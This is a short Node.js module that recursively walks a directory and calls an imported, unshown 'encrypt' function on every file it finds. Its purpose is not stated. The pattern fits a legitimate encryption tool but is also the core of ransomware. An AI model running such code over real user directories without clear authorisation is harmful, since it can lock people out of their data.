const fs= require('fs');
const path=require('path');

const encrypt=require('./encrypt');
async function walkDirectory(dirPath) {
    const dir = await fs.promises.opendir(dirPath);
    for await (const dirent of dir) {
      if(dirent.isDirectory()){
          walkDirectory(path.join(dirPath,dirent.name));
      }
      else{
        encrypt(path.join(dirPath,dirent.name));
      }
    }
  }

module.exports = walkDirectory;